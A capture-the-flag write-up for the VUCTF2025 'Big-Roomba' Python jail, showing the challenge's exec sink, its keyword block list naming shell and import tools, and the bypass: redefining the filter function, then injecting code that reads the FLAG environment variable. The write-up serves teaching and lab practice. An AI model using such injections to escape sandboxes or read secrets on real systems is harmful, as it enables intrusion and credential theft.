# VUCTF2025 Big-Roomba

This challenge is the hardened version of the [Baby-Roomba](https://github.com/TSpeel/writeups/tree/main/VUCTF2025/Baby-Roomba) challenge. 
The vulnerability from the previous challenge is no longer present, and has been replaced by a `exec` sink we can reach when sending the update command. 
Leveraging this sink to leak the flag from the `FLAG` environment variable is however more tricky this time, as there is an input filter present that limits what we can use in our payload:
```
def get_banned():
    return [
        "help",
        "import",
        "eval",
        "exec",
        "os",
        "sys",
        "open",
        "chr",
        "system",
        "builtin",
        "subprocess",
        "pty",
        "popen",
        "read",
        "get_data",
        "'",
        "__",
        ".",
    ]


cmd = "1337"
while cmd != "exit":
    try:
        cmd = input(">>> ")
    
        if cmd == "exit":
            print("Goodbye!")
        elif cmd == "help":
            print("Commands: exit, help, update")
        elif len(cmd) > 5 and cmd[:6] == "update":
            print("Parsing update data...")
    
            if all(x in string.printable for x in cmd[7:]) and not any(x in cmd[7:] for x in get_banned()):
                print("Parse succesful, executing update...")
                exec(cmd[7:])
            else:
                raise ValueError("Update parsing failed!")
        else:
            print("Invalid command. Type 'help' for a list")
    except:
        cmd = "exit"
```
Recall the payload we used for the BabyRoomba challenge:
```
print(__import__('os').environ['FLAG'])
```
This payload would now no longer work, as it contains `__`, `import`,`'`,`os` and `.`. The challenge thus lies in bypassing this input filter. At first I started by simply eliminating the parts of the payload that violated the filter. `'` could simply be replaced by `"`, and `"os"` could then be replaced by `"o"+"s"`. The other parts of the payload matching the filter were a lot more difficult.

I started researching ways to bypass the filter and stumbled upon the following [article](https://motasemhamdan.medium.com/hackthebox-locked-away-python-ctf-writeups-1108ac87b898). 
This article not only contains ways to bypass such filters, as I was looking for, but also contains another interesting attack angle. 
It mentions that sometimes the injection can be used to simply overwrite the filter, and thus eliminating the need to alter the payload. 
Looking back at our source code, we can see that this is possible as well! 
The filter is defined as a function, which we can simply overwrite with a new function that returns an empty list. This completely disables the filter. The attack thus looks as follows:
```
$ nc master-roomba.studsec.nl 4003
--------------------------------------------------------------------------------
|                            Welcome to Roomba C&C!                            |
|                             "They've grown old."                             |
--------------------------------------------------------------------------------


>>> update def get_banned(): return []
update def get_banned(): return []
Parsing update data...
Parse succesful, executing update...
>>> update print(__import__('os').environ['FLAG'])
update print(__import__('os').environ['FLAG'])
Parsing update data...
Parse succesful, executing update...
VUCTF{REDACTED}
>>> 
```
